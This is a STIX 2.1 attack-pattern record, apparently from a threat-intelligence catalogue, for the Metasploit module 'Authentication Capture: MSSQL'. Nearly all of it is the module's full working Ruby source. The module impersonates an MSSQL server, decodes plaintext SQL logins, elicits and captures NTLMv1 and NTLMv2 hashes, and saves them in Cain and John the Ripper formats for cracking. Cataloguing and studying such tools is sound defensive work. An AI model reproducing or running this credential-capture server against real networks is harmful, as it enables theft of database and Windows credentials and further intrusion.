{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--34698210-10ba-4f8f-bf2d-ab479c0ecd36",
    "created": "2024-08-14T16:22:00.815007Z",
    "modified": "2024-08-14T16:22:00.815011Z",
    "name": "Authentication Capture: MSSQL",
    "description": " This module provides a fake MSSQL service that is designed to capture authentication credentials. The modules supports both the weak encoded database logins as well as Windows logins (NTLM). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/mssql.rb",
            "external_id": "mssql.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nNTLM_CONST = Rex::Proto::NTLM::Constants\nNTLM_CRYPT = Rex::Proto::NTLM::Crypt\nNTLM_UTILS = Rex::Proto::NTLM::Utils\nMESSAGE = Rex::Proto::NTLM::Message\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Auxiliary::Report\n\n  class Constants\n    TDS_MSG_RESPONSE  = 0x04\n    TDS_MSG_LOGIN     = 0x10\n    TDS_MSG_SSPI      = 0x11\n    TDS_MSG_PRELOGIN  = 0x12\n\n    TDS_TOKEN_ERROR   = 0xAA\n    TDS_TOKEN_AUTH    = 0xED\n  end\n\n  def initialize\n    super(\n      'Name'           => 'Authentication Capture: MSSQL',\n      'Description'    => %q{\n        This module provides a fake MSSQL service that\n      is designed to capture authentication credentials. The modules\n      supports both the weak encoded database logins as well as Windows\n      logins (NTLM).\n      },\n      'Author'         => 'Patrik Karlsson <patrik[at]cqure.net>',\n      'License'        => MSF_LICENSE,\n      'Actions'        => [[ 'Capture', 'Description' => 'Run MSSQL capture server' ]],\n      'PassiveActions' => [ 'Capture' ],\n      'DefaultAction'  => 'Capture'\n    )\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The local port to listen on.\", 1433 ]),\n        OptString.new('CAINPWFILE',  [ false, \"The local filename to store the hashes in Cain&Abel format\", nil ]),\n        OptString.new('JOHNPWFILE',  [ false, \"The prefix to the local filename to store the hashes in JOHN format\", nil ]),\n        OptString.new('CHALLENGE',   [ true, \"The 8 byte challenge \", \"1122334455667788\" ])\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new(\"SMB_EXTENDED_SECURITY\", [ true, \"Use smb extended security negotiation, when set client will use ntlmssp, if not then client will use classic lanman authentication\", false ]),\n        OptString.new('DOMAIN_NAME',         [ true, \"The domain name used during smb exchange with smb extended security set \", \"anonymous\" ])\n      ])\n\n  end\n\n  def setup\n    super\n    @state = {}\n  end\n\n  def run\n    @s_smb_esn = datastore['SMB_EXTENDED_SECURITY']\n    @domain_name = datastore['DOMAIN_NAME']\n    if datastore['CHALLENGE'].to_s =~ /^([a-fA-F0-9]{16})$/\n      @challenge = [ datastore['CHALLENGE'] ].pack(\"H*\")\n    else\n      print_error(\"CHALLENGE syntax must match 1122334455667788\")\n      return\n    end\n\n    # those variables will prevent to spam the screen with identical hashes (works only with ntlmv1)\n    @previous_lm_hash=\"none\"\n    @previous_ntlm_hash=\"none\"\n\n    exploit()\n  end\n\n  def on_client_connect(c)\n    @state[c] = {\n      :name    => \"#{c.peerhost}:#{c.peerport}\",\n      :ip      => c.peerhost,\n      :port    => c.peerport,\n      :user    => nil,\n      :pass    => nil\n    }\n  end\n\n  # decodes a mssql password\n  def mssql_tds_decrypt(pass)\n    Rex::Text.to_ascii(pass.unpack(\"C*\").map {|c| ((( c ^ 0xa5 ) & 0x0F) << 4) | ((( c ^ 0xa5 ) & 0xF0 ) >> 4) }.pack(\"C*\"))\n  end\n\n  # doesn't do any real parsing, slices of the data\n  def mssql_parse_prelogin(data, info)\n    status = data.slice!(0,1).unpack('C')[0]\n    len = data.slice!(0,2).unpack('n')[0]\n\n    # just slice away the rest of the packet\n    data.slice!(0, len - 4)\n    return []\n  end\n\n  # parses a login packet sent to the server\n  def mssql_parse_login(data, info)\n    status = data.slice!(0,1).unpack('C')[0]\n    len = data.slice!(0,2).unpack('n')[0]\n\n    if len > data.length + 4\n      info[:errors] << \"Login packet to short\"\n      return\n    end\n\n    # slice of:\n    #   * channel, packetno, window\n    #   * login header\n    #   * client name lengt & offset\n    login_hdr = data.slice!(0,4 + 36 + 4)\n\n    username_offset = data.slice!(0,2).unpack('v')[0]\n    username_length = data.slice!(0,2).unpack('v')[0]\n\n    pw_offset = data.slice!(0,2).unpack('v')[0]\n    pw_length = data.slice!(0,2).unpack('v')[0]\n\n    appname_offset = data.slice!(0,2).unpack('v')[0]\n    appname_length = data.slice!(0,2).unpack('v')[0]\n\n    srvname_offset = data.slice!(0,2).unpack('v')[0]\n    srvname_length = data.slice!(0,2).unpack('v')[0]\n\n    if username_offset > 0 and pw_offset > 0\n      offset = username_offset - 56\n      info[:user] = Rex::Text::to_ascii(data[offset..(offset + username_length * 2)])\n\n      offset = pw_offset - 56\n      if pw_length == 0\n        info[:pass] = \"<empty>\"\n      else\n        info[:pass] = mssql_tds_decrypt(data[offset..(offset + pw_length * 2)].unpack(\"A*\")[0])\n      end\n\n      offset = srvname_offset - 56\n      info[:srvname] = Rex::Text::to_ascii(data[offset..(offset + srvname_length * 2)])\n    else\n      info[:isntlm?]= true\n    end\n\n    # slice of remaining packet\n    data.slice!(0, data.length)\n\n    info\n  end\n\n  # copied and slightly modified from http_ntlm html_get_hash\n  def mssql_get_hash(arg = {})\n    ntlm_ver = arg[:ntlm_ver]\n    if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE or ntlm_ver == NTLM_CONST::NTLM_2_SESSION_RESPONSE\n      lm_hash = arg[:lm_hash]\n      nt_hash = arg[:nt_hash]\n    else\n      lm_hash = arg[:lm_hash]\n      nt_hash = arg[:nt_hash]\n      lm_cli_challenge = arg[:lm_cli_challenge]\n      nt_cli_challenge = arg[:nt_cli_challenge]\n    end\n    domain = arg[:domain]\n    user = arg[:user]\n    host = arg[:host]\n    ip = arg[:ip]\n\n    unless @previous_lm_hash == lm_hash and @previous_ntlm_hash == nt_hash then\n      @previous_lm_hash = lm_hash\n      @previous_ntlm_hash = nt_hash\n      # Check if we have default values (empty pwd, null hashes, ...) and adjust the on-screen messages correctly\n      case ntlm_ver\n      when NTLM_CONST::NTLM_V1_RESPONSE\n        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack(\"H*\"),:srv_challenge => @challenge,\n          :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'ntlm' })\n          print_status(\"NLMv1 Hash correspond to an empty password, ignoring ... \")\n          return\n        end\n        if (lm_hash == nt_hash or lm_hash == \"\" or lm_hash =~ /^0*$/ ) then\n          lm_hash_message = \"Disabled\"\n        elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack(\"H*\"),:srv_challenge => @challenge,\n          :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'lm' })\n          lm_hash_message = \"Disabled (from empty password)\"\n        else\n          lm_hash_message = lm_hash\n          lm_chall_message = lm_cli_challenge\n        end\n      when NTLM_CONST::NTLM_V2_RESPONSE\n        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack(\"H*\"),:srv_challenge => @challenge,\n          :cli_challenge => [nt_cli_challenge].pack(\"H*\"),\n          :user => Rex::Text::to_ascii(user),\n          :domain => Rex::Text::to_ascii(domain),\n          :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'ntlm' })\n          print_status(\"NTLMv2 Hash correspond to an empty password, ignoring ... \")\n          return\n        end\n        if lm_hash == '0' * 32 and lm_cli_challenge == '0' * 16\n          lm_hash_message = \"Disabled\"\n          lm_chall_message = 'Disabled'\n        elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack(\"H*\"),:srv_challenge => @challenge,\n          :cli_challenge => [lm_cli_challenge].pack(\"H*\"),\n          :user => Rex::Text::to_ascii(user),\n          :domain => Rex::Text::to_ascii(domain),\n          :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'lm' })\n          lm_hash_message = \"Disabled (from empty password)\"\n          lm_chall_message = 'Disabled'\n        else\n          lm_hash_message = lm_hash\n          lm_chall_message = lm_cli_challenge\n        end\n      when NTLM_CONST::NTLM_2_SESSION_RESPONSE\n        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack(\"H*\"),:srv_challenge => @challenge,\n          :cli_challenge => [lm_hash].pack(\"H*\")[0,8],\n          :ntlm_ver => NTLM_CONST::NTLM_2_SESSION_RESPONSE, :type => 'ntlm' })\n          print_status(\"NTLM2_session Hash correspond to an empty password, ignoring ... \")\n          return\n        end\n        lm_hash_message = lm_hash\n        lm_chall_message = lm_cli_challenge\n      end\n\n      # Display messages\n      domain = Rex::Text::to_ascii(domain)\n      user = Rex::Text::to_ascii(user)\n\n      capturedtime = Time.now.to_s\n      case ntlm_ver\n      when NTLM_CONST::NTLM_V1_RESPONSE\n        smb_db_type_hash = Metasploit::Framework::Hashes::JTR_NTLMV1\n        capturelogmessage =\n        \"#{capturedtime}\\nNTLMv1 Response Captured from #{host} \\n\" +\n        \"DOMAIN: #{domain} USER: #{user} \\n\" +\n        \"LMHASH:#{lm_hash_message ? lm_hash_message : \"<NULL>\"} \\nNTHASH:#{nt_hash ? nt_hash : \"<NULL>\"}\\n\"\n      when NTLM_CONST::NTLM_V2_RESPONSE\n        smb_db_type_hash = Metasploit::Framework::Hashes::JTR_NTLMV2\n        capturelogmessage =\n        \"#{capturedtime}\\nNTLMv2 Response Captured from #{host} \\n\" +\n        \"DOMAIN: #{domain} USER: #{user} \\n\" +\n        \"LMHASH:#{lm_hash_message ? lm_hash_message : \"<NULL>\"} \" +\n        \"LM_CLIENT_CHALLENGE:#{lm_chall_message ? lm_chall_message : \"<NULL>\"}\\n\" +\n        \"NTHASH:#{nt_hash ? nt_hash : \"<NULL>\"} \" +\n        \"NT_CLIENT_CHALLENGE:#{nt_cli_challenge ? nt_cli_challenge : \"<NULL>\"}\\n\"\n      when NTLM_CONST::NTLM_2_SESSION_RESPONSE\n        #we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr\n        #also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture\n        smb_db_type_hash = Metasploit::Framework::Hashes::JTR_NTLMV1\n        capturelogmessage =\n        \"#{capturedtime}\\nNTLM2_SESSION Response Captured from #{host} \\n\" +\n        \"DOMAIN: #{domain} USER: #{user} \\n\" +\n        \"NTHASH:#{nt_hash ? nt_hash : \"<NULL>\"}\\n\" +\n        \"NT_CLIENT_CHALLENGE:#{lm_hash_message ? lm_hash_message[0,16] : \"<NULL>\"} \\n\"\n\n      else # should not happen\n        return\n      end\n\n      print_status(capturelogmessage)\n\n      # DB reporting\n      # Rem :  one report it as a smb_challenge on port 445 has breaking those hashes\n      # will be mainly use for psexec / smb related exploit\n\n      jtr_hash = case smb_db_type_hash\n      when Metasploit::Framework::Hashes::JTR_NTLMV2\n        user + \"::\" + domain + \":\" + datastore['CHALLENGE'].to_s + \":\" + nt_hash + \":\" + nt_cli_challenge.to_s\n      when Metasploit::Framework::Hashes::JTR_NTLMV1\n        user + \"::\" + domain + \":\" + lm_cli_challenge.to_s + \":\" + lm_hash + \":\" + datastore['CHALLENGE']\n      end\n\n      report_cred(\n        ip: ip,\n        port: 445,\n        user: user,\n        sname: 'smb_client',\n        password: jtr_hash,\n        proof: \"DOMAIN=#{domain}\",\n        type: :nonreplayable_hash,\n        jtr_format: smb_db_type_hash\n      )\n      #if(datastore['LOGFILE'])\n      #\tFile.open(datastore['LOGFILE'], \"ab\") {|fd| fd.puts(capturelogmessage + \"\\n\")}\n      #end\n\n      if(datastore['CAINPWFILE'] and user)\n        if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE or ntlm_ver == NTLM_CONST::NTLM_2_SESSION_RESPONSE\n          fd = File.open(datastore['CAINPWFILE'], \"ab\")\n          fd.puts(\n          [\n            user,\n            domain ? domain : \"NULL\",\n            @challenge.unpack(\"H*\")[0],\n            lm_hash ? lm_hash : \"0\" * 48,\n            nt_hash ? nt_hash : \"0\" * 48\n            ].join(\":\").gsub(/\\n/, \"\\\\n\")\n            )\n            fd.close\n        end\n      end\n\n      if(datastore['JOHNPWFILE'] and user)\n        case ntlm_ver\n        when NTLM_CONST::NTLM_V1_RESPONSE, NTLM_CONST::NTLM_2_SESSION_RESPONSE\n          fd = File.open(datastore['JOHNPWFILE'] + '_netntlm', \"ab\")\n          fd.puts(\n          [\n            user,\"\",\n            domain ? domain : \"NULL\",\n            lm_hash ? lm_hash : \"0\" * 48,\n            nt_hash ? nt_hash : \"0\" * 48,\n            @challenge.unpack(\"H*\")[0]\n            ].join(\":\").gsub(/\\n/, \"\\\\n\")\n            )\n            fd.close\n        when NTLM_CONST::NTLM_V2_RESPONSE\n          #lmv2\n          fd = File.open(datastore['JOHNPWFILE'] + '_netlmv2', \"ab\")\n          fd.puts(\n            [\n              user,\"\",\n              domain ? domain : \"NULL\",\n              @challenge.unpack(\"H*\")[0],\n              lm_hash ? lm_hash : \"0\" * 32,\n              lm_cli_challenge ? lm_cli_challenge : \"0\" * 16\n            ].join(\":\").gsub(/\\n/, \"\\\\n\")\n          )\n          fd.close\n          #ntlmv2\n          fd = File.open(datastore['JOHNPWFILE'] + '_netntlmv2' , \"ab\")\n          fd.puts(\n            [\n              user,\"\",\n              domain ? domain : \"NULL\",\n              @challenge.unpack(\"H*\")[0],\n              nt_hash ? nt_hash : \"0\" * 32,\n              nt_cli_challenge ? nt_cli_challenge : \"0\" * 160\n              ].join(\":\").gsub(/\\n/, \"\\\\n\")\n          )\n          fd.close\n        end\n      end\n    end\n  end\n\n  def mssql_parse_ntlmsspi(data, info)\n    start = data.index('NTLMSSP')\n    if start\n      data.slice!(0,start)\n    else\n      print_error(\"Failed to find NTLMSSP authentication blob\")\n      return\n    end\n\n    ntlm_message = NTLM_MESSAGE::parse(data)\n    case ntlm_message\n    when NTLM_MESSAGE::Type3\n      lm_len = ntlm_message.lm_response.length # Always 24\n      nt_len = ntlm_message.ntlm_response.length\n\n      if nt_len == 24 #lmv1/ntlmv1 or ntlm2_session\n        arg = {\t:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,\n          :lm_hash => ntlm_message.lm_response.unpack('H*')[0],\n          :nt_hash => ntlm_message.ntlm_response.unpack('H*')[0]\n        }\n\n        if @s_ntlm_esn && arg[:lm_hash][16,32] == '0' * 32\n          arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE\n        end\n        # if the length of the ntlm response is not 24 then it will be bigger and represent\n        # a ntlmv2 response\n      elsif nt_len > 24 #lmv2/ntlmv2\n        arg = {\t:ntlm_ver \t\t=> NTLM_CONST::NTLM_V2_RESPONSE,\n          :lm_hash \t\t=> ntlm_message.lm_response[0, 16].unpack('H*')[0],\n          :lm_cli_challenge \t=> ntlm_message.lm_response[16, 8].unpack('H*')[0],\n          :nt_hash \t\t=> ntlm_message.ntlm_response[0, 16].unpack('H*')[0],\n          :nt_cli_challenge \t=> ntlm_message.ntlm_response[16, nt_len - 16].unpack('H*')[0]\n        }\n      elsif nt_len == 0\n        print_status(\"Empty hash from #{smb[:name]} captured, ignoring ... \")\n        return\n      else\n        print_status(\"Unknown hash type from #{smb[:name]}, ignoring ...\")\n        return\n      end\n\n      arg[:user] = ntlm_message.user\n      arg[:domain]   = ntlm_message.domain\n      arg[:ip] = info[:ip]\n      arg[:host] = info[:ip]\n\n      begin\n        mssql_get_hash(arg)\n      rescue ::Exception => e\n        print_error(\"Error processing Hash from #{smb[:name]} : #{e.class} #{e} #{e.backtrace}\")\n      end\n    else\n      info[:errors] << \"Unsupported NTLM authentication message type\"\n    end\n\n    # slice of remainder\n    data.slice!(0,data.length)\n  end\n\n  #\n  # Parse individual tokens from a TDS reply\n  #\n  def mssql_parse_reply(data, info)\n    info[:errors] = []\n    return if not data\n    until data.empty? or ( info[:errors] and not info[:errors].empty? )\n      token = data.slice!(0,1).unpack('C')[0]\n      case token\n      when Constants::TDS_MSG_LOGIN\n        mssql_parse_login(data, info)\n        info[:type] = Constants::TDS_MSG_LOGIN\n      when Constants::TDS_MSG_PRELOGIN\n        mssql_parse_prelogin(data, info)\n        info[:type] = Constants::TDS_MSG_PRELOGIN\n      when Constants::TDS_MSG_SSPI\n        mssql_parse_ntlmsspi(data, info)\n        info[:type] = Constants::TDS_MSG_SSPI\n      else\n        info[:errors] << \"unsupported token: #{token}\"\n      end\n    end\n    info\n  end\n\n  # Sends an error message to the MSSQL client\n  def mssql_send_error(c, msg)\n    data = [\n      Constants::TDS_MSG_RESPONSE,\n      1, # status\n      0x0020 + msg.length * 2,\n      0x0037, # channel: 55\n      0x01,   # packet no: 1\n      0x00,   # window: 0\n      Constants::TDS_TOKEN_ERROR,\n      0x000C + msg.length * 2,\n      18456,  # SQL Error number\n      1,      # state: 1\n      14,     # severity: 14\n      msg.length,   # error msg length\n      0,\n      Rex::Text::to_unicode(msg),\n      0, # server name length\n      0, # process name length\n      0, # line number\n      \"fd0200000000000000\"\n      ].pack(\"CCnnCCCvVCCCCA*CCnH*\")\n    c.put data\n  end\n\n  def mssql_send_ntlm_challenge(c, info)\n    win_domain = Rex::Text.to_unicode(@domain_name.upcase)\n    win_name = Rex::Text.to_unicode(@domain_name.upcase)\n    dns_domain = Rex::Text.to_unicode(@domain_name.downcase)\n    dns_name = Rex::Text.to_unicode(@domain_name.downcase)\n\n    if @s_ntlm_esn\n      sb_flag = 0xe28a8215 # ntlm2\n    else\n      sb_flag = 0xe2828215 #no ntlm2\n    end\n\n    securityblob = NTLM_UTILS::make_ntlmssp_blob_chall( win_domain,\n      win_name,\n      dns_domain,\n      dns_name,\n      @challenge,\n      sb_flag)\n\n    data = [\n      Constants::TDS_MSG_RESPONSE,\n      1, # status\n      11 + securityblob.length, # length\n      0x0000, # channel\n      0x01,   # packetno\n      0x00,   # window\n      Constants::TDS_TOKEN_AUTH,   # token: authentication\n      securityblob.length, # length\n      securityblob\n    ].pack(\"CCnnCCCvA*\")\n    c.put data\n  end\n\n  def mssql_send_prelogin_response(c, info)\n    data = [\n      Constants::TDS_MSG_RESPONSE,\n      1, # status\n      0x002b, # length\n      \"0000010000001a00060100200001020021000103002200000400220001ff0a3206510000020000\"\n    ].pack(\"CCnH*\")\n    c.put data\n  end\n\n  def on_client_data(c)\n    info = {:errors => [], :ip => @state[c][:ip]}\n    data = c.get_once\n    return if not data\n\n    info = mssql_parse_reply(data, info)\n\n    if(info[:errors] and not info[:errors].empty?)\n      print_error(\"#{info[:errors]}\")\n      c.close\n      return\n    end\n\n    # no errors, and the packet was a prelogin\n    # if we just close the connection here, it seems that the client:\n    # SQL Server Management Studio 2008R2, falls back to the weaker encoded\n    # password authentication.\n    case info[:type]\n    when Constants::TDS_MSG_PRELOGIN\n      mssql_send_prelogin_response(c, info)\n\n    when Constants::TDS_MSG_SSPI\n      mssql_send_error(c, \"Error: Login failed. The login is from an untrusted domain and cannot be used with Windows authentication.\")\n\n    when Constants::TDS_MSG_LOGIN\n      if info[:isntlm?] == true\n        mssql_send_ntlm_challenge(c, info)\n      elsif info[:user] and info[:pass]\n\n        report_cred(\n          ip: @state[c][:ip],\n          sname: 'mssql_client',\n          user: info[:user],\n          password: info[:pass],\n          type: :password\n        )\n\n        print_status(\"MSSQL LOGIN #{@state[c][:name]} #{info[:user]} / #{info[:pass]}\")\n        mssql_send_error(c, \"Login failed for user '#{info[:user]}'.\")\n\n        c.close\n      end\n    end\n  end\n\n  def on_client_close(c)\n    @state.delete(c)\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port] || datastore['SRVPORT'],\n      service_name: opts[:sname],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: opts[:type],\n      jtr_format: opts[:jtr_format]\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\nend\n"
}